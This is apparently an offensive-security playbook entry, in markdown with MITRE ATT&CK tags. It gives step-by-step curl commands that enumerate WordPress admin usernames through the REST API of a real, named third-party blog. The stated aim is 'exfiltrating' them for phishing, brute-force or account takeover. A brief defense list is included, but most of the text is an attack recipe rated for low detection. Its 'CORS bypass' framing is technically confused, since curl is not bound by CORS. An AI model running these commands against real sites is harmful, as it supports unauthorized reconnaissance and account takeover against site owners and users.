---
tags:
  - data-exfiltration
  - user-enumeration
  - info-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-wordpress-rest-api-cors-bypass]]'
platforms:
  - Web
  - WordPress
techniques:
  - '[[Client Configurations]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 470ebbf5-fca3-454b-8cf5-77c4f1ff530b
created_at: '2025-12-14T17:29:36.418Z'
updated_at: '2025-12-14T17:29:36.418Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Client Configurations]]'
---
# Observe-and-Exfiltrate-Sensitive-Data

## Summary

This procedure focuses on analyzing the responses from exploited WordPress REST API endpoints to identify and exfiltrate sensitive information, such as admin usernames, user IDs, and site details, for use in subsequent attacks.

## Description

Once access is gained via CORS bypass, the JSON responses from /wp-json/ and /wp/v2/users reveal critical data: site name, description, available routes, and user objects with slugs (e.g., 'admin' usernames). This information can be observed directly or exfiltrated via POST requests in scripts, aiding in targeted phishing, brute-force attempts, or account takeover planning. The procedure emphasizes parsing and validating the exposure.

## Requirements

1. Prior successful API access (from previous procedures)
2. JSON parsing tool or manual inspection
3. Exfiltration endpoint setup (optional for observation)

## Defense

Defensive measures and detection strategies:

- Disable or authenticate user enumeration endpoints (/wp/v2/users) using plugins like WP REST API Authentication
- Implement rate limiting on API calls to prevent automated scraping
- Log and alert on high-volume unauthenticated API requests

## Objectives

1. Identify admin and user details in API responses
2. Confirm leakage of site metadata
3. Securely exfiltrate data for analysis

## Instructions

### Step 1: Query User Endpoint for Enumeration

**Context**: Use the bypassed CORS to directly fetch user data, observing usernames and roles.

**Command** ([[commands/curl-wordpress-rest-api-cors-bypass]]):
```bash
curl -H "Origin: http://127.0.0.1:8080" https://blog.yelp.com/wp-json/wp/v2/users
```

> Returns JSON array of users, e.g., [{'id':1,'slug':'admin','name':'Administrator'}]. Look for admin indicators in slugs or roles.

### Step 2: Exfiltrate and Analyze

**Context**: Pipe the output to a file or send to an external server for storage and further parsing.

**Command** ([[commands/curl-wordpress-rest-api-cors-bypass]]):
```bash
curl -H "Origin: http://127.0.0.1:8080" https://blog.yelp.com/wp-json/wp/v2/users | jq '.[] | {id: .id, username: .slug}'
```

> Filters to key fields like IDs and usernames. Save to file: add > users.json. Success: Extracted list of potential admin accounts.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Client Configurations]] Gather Victim Identity Information

### Sub-Techniques

- N/A

## Commands Used

- [[commands/curl-wordpress-rest-api-cors-bypass]]

## Tools Used

- N/A

## Tags

- [[data-exfiltration]]
- [[user-enumeration]]
- [[info-leak]]
